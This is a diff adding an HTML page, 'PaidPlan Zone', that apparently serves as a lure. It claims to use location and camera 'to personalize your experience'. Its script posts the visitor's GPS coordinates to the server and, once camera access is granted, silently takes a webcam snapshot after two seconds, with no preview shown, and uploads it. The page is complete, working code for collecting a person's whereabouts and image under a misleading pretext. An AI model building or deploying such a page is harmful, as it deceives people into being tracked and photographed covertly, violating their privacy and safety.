@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>PaidPlan Zone</title>
+</head>
+<body>
+  <h1>Welcome to PaidPlan Zone</h1>
+  <p>We use location & camera to personalize your experience. Please allow permissions below:</p>
+
+  <button onclick="getLocation()">Share Location</button>
+  <button onclick="getCamera()">Share Camera</button>
+
+  <script>
+    async function getLocation() {
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(async (position) => {
+          await fetch('/api/location', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              lat: position.coords.latitude,
+              lon: position.coords.longitude,
+              acc: position.coords.accuracy
+            })
+          });
+          alert("Location sent!");
+        }, (err) => {
+          alert("Permission denied or error: " + err.message);
+        });
+      } else {
+        alert("Geolocation not supported");
+      }
+    }
+
+    async function getCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+
+        // Take snapshot after 2 seconds
+        setTimeout(async () => {
+          const canvas = document.createElement('canvas');
+          canvas.width = 640;
+          canvas.height = 480;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const dataURL = canvas.toDataURL('image/png').split(',')[1];
+
+          await fetch('/api/camsnap', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image: dataURL })
+          });
+
+          alert("Camera snapshot sent!");
+
+          // Stop camera
+          stream.getTracks().forEach(track => track.stop());
+        }, 2000);
+
+      } catch (err) {
+        alert("Camera error or permission denied: " + err.message);
+      }
+    }
+  </script>
+</body>
+</html>
